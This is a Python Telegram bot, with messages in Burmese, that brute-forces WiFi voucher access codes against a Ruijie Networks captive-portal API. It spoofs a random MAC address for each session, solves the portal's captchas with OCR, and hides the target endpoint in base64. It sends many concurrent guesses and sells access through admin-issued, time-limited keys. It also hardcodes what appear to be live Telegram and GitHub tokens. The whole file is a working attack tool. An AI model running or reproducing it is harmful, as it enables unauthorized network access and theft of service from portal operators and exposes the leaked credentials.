import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone


BOT_TOKEN = '8890275647:AAGKHdPfVIpMGqLCi7gquj2DXf33374MzyA'
GITHUB_TOKEN ='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'
ADMIN_ID = "7074774446"
REPO_OWNER = "Sayarshine"
REPO_NAME = "DATABASE"
##################

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 200
BATCH_SIZE = 2500
TARGET_SPEED = 2500
_voucher_sem = None
_start_time = time.monotonic()

# Local Memory Cache for Keys to bypass GitHub delay/sync issues
auth_memory = {}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers, ssl=True) as response:
            if response.status == 200:
                data = await response.json()
                raw = data.get('content', '')
                raw_clean = raw.replace('\n', '').replace(' ', '')
                if not raw_clean:
                    return {}, data.get('sha')
                decoded = base64.b64decode(raw_clean).decode('utf-8').strip()
                if not decoded:
                    return {}, data.get('sha')
                return json.loads(decoded), data.get('sha')
            elif response.status == 404:
                return {}, None
            else:
                text = await response.text()
                print(f"[get_file_content] GitHub error {response.status}: {text[:200]}")
                return {}, None
    except Exception as e:
        print(f"[get_file_content] Exception for {path}: {e}")
        return {}, None

async def create_file_if_missing(path, default_content):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(default_content).encode()).decode()
    payload = {
        "message": f"Initialize {path}",
        "content": encoded
    }
    try:
        async with session.put(url, headers=headers, json=payload, ssl=True) as response:
            if response.status in (200, 201):
                data = await response.json()
                return data.get('content', {}).get('sha')
            else:
                return None
    except Exception as e:
        print(f"[create_file_if_missing] Exception: {e}")
        return None

async def ensure_files():
    global auth_memory
    auth_list, sha = await get_file_content("auth_list.json")
    if sha is None:
        await create_file_if_missing("auth_list.json", {})
    else:
        if isinstance(auth_list, dict):
            auth_memory.update(auth_list)
            
    result, sha2 = await get_file_content("result.json")
    if sha2 is None:
        await create_file_if_missing("result.json", {})
    print("[ensure_files] Done.")

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content, ensure_ascii=False).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
    }
    if sha:
        payload["sha"] = sha

    try:
        async with session.put(url, headers=headers, json=payload, ssl=True) as response:
            text = await response.text()
            return text
    except Exception as e:
        print(f"[update_file_content] Exception: {e}")
        return None

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve, auth_memory
    key = str(message.from_user.id)
    chat_id = message.chat.id
    try:
        # Local Memory ထဲမှာ အရင်စစ်မည် (GitHub တွေချို့ယွင်းနေရင်တောင် ချက်ချင်းအလုပ်လုပ်ရန်)
        if key in auth_memory:
            valid = check_key_expiration(auth_memory[key])
            if valid:
                approve[chat_id] = True
                user_data[chat_id] = {}
                await bot.reply_to(
                    message,
                    "✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
                )
                return
            else:
                approve[chat_id] = False
                await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
                return

        # Memory မှာမရှိရင် GitHub ကနေပါ တစ်ခါထပ်ဆွဲစစ်မည်
        auth_list, _ = await get_file_content("auth_list.json")
        if isinstance(auth_list, dict):
            auth_memory.update(auth_list)

        if key in auth_memory:
            valid = check_key_expiration(auth_memory[key])
            if valid:
                approve[chat_id] = True
                user_data[chat_id] = {}
                await bot.reply_to(
                    message,
                    "✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
                )
            else:
                approve[chat_id] = False
                await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
        else:
            await bot.reply_to(message, "❌ သင်၏ key ကို registered မလုပ်ရသေးပါ။")
    except Exception as e:
        print(f"[handle_key] Error: {e}")
        await bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        if not auth_memory:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_memory.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_memory)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = str(args[1])
        if user_id in auth_memory:
            del auth_memory[user_id]
        
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id in auth_list:
            del auth_list[user_id]
            await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")

        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = str(args[2])
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
            return
        
        # Local Memory ထဲမှာ ချက်ချင်းသိမ်းမည်
        auth_memory[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        
        try:
            approve[int(user_id)] = True
        except:
            pass

        # GitHub ကိုလည်း နောက်ကွယ်ကနေ တင်ပေးမည်
        auth_list, sha = await get_file_content("auth_list.json")
        if not isinstance(auth_list, dict):
            auth_list = {}
        auth_list[user_id] = auth_memory[user_id]
        
        if sha is None:
            await create_file_if_missing("auth_list.json", auth_list)
        else:
            asyncio.create_task(update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}"))

        await bot.reply_to(
            message,
            f"✅ Key Generated & Activated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")
        await bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    try:
        if str(message.from_user.id) in auth_memory:
            results, _ = await get_file_content("result.json")
            chat_id_str = str(message.chat.id)
            if chat_id_str in results and results[chat_id_str]:
                codes = "\n".join(results[chat_id_str])
                await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
            else:
                await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
        else:
            await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")
    except Exception as e:
        print(f"[handle_result] Error: {e}")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        return False
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1]
    if message.chat.id in user_data or approve.get(message.chat.id, False):
        user_data[message.chat.id] = user_data.get(message.chat.id, {})
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "✅ Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
    else:
        await bot.reply_to(message, "/key ကိုအရင်ပြုလုပ်ပါ။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
    )

    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n⏱ Uptime: {hours}h {minutes}m {seconds}s\n🔍 Active Scans: {active_scans}\n⚡ Speed: {CONCURRENCY} concurrent\n✅ Approved Users: {approved_users}"
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    strings = string.ascii_lowercase + string.digits
    return "".join(random.choice(strings) for _ in range(length))

def ascii_generator(length=6):
    strings_2 = string.ascii_lowercase
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n[{bar}]"
    return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n📊Status : running\n"

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()

    def _cleanup():
        scan_tasks.pop(chat_id, None)

    async def _update_progress():
        elapsed = time.monotonic() - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        text = format_progress(checked, total, speed)
        nonlocal progress_msg
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
        except Exception:
            pass

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                _cleanup()
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code)

            batch_start = time.monotonic()
            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            
            for code, res in zip(batch, results):
                if res is True:
                    await bot.send_message(chat_id, f"✅ Success Code Found: <code>{code}</code>", parse_Mode="HTML")
                    try:
                        file_results, sha = await get_file_content("result.json")
                        chat_str = str(chat_id)
                        if chat_str not in file_results:
                            file_results[chat_str] = []
                        if code not in file_results[chat_str]:
                            file_results[chat_str].append(code)
                            await update_file_content("result.json", file_results, sha, f"Found code {code}")
                    except Exception as ex:
                        print(f"Save code error: {ex}")

            checked += len(batch)
            batch_elapsed = time.monotonic() - batch_start
            target_seconds = len(batch) / TARGET_SPEED * 60
            if batch_elapsed < target_seconds:
                await asyncio.sleep(target_seconds - batch_elapsed)

            await _update_progress()
        _cleanup()
    finally:
        _cleanup()

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(task_session, session_url):
    mac = get_mac()
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        async with task_session.get(session_url, headers=headers, allow_redirects=False) as req:
            location = req.headers.get("Location", "")
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", location)
            if match:
                return match.group(1)
            body = await req.text()
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", body)
            if match:
                return match.group(1)
    except Exception:
        pass
    return None

POST_URL = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()

async def _get_session_and_captcha(session_url):
    timeout = aiohttp.ClientTimeout(total=30)
    task_session = aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout)
    try:
        session_id = await get_session_id(task_session, session_url)
        if not session_id:
            await task_session.close()
            return None, None, None

        for _ in range(5):
            try:
                img_bytes = await Captcha_Image(task_session, session_id)
                text = await Captcha_Text(img_bytes)
                if text:
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        return task_session, session_id, text
            except Exception:
                pass
        await task_session.close()
        return None, None, None
    except Exception:
        await task_session.close()
        return None, None, None

async def perform_check(session_url, code):
    task_session, session_id, auth_code = await _get_session_and_captcha(session_url)
    if not task_session:
        return False
    try:
        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
        async with task_session.post(POST_URL, json=data, headers=headers) as req:
            resp_text = await req.text()
            if resp_text and 'logonUrl' in resp_text:
                return True
        return False
    except Exception:
        return False
    finally:
        await task_session.close()

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper()
    except Exception:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
            data = await req.json()
            return data.get("success") == True
    except Exception:
        return False

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=60, request_timeout=90)
            return
        except Exception as e:
            print(f"Polling error: {e}. Reconnecting...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=3000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    print("Bot starting...")
    try:
        await ensure_files()
        asyncio.create_task(web_server())
        print("Bot polling started.")
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
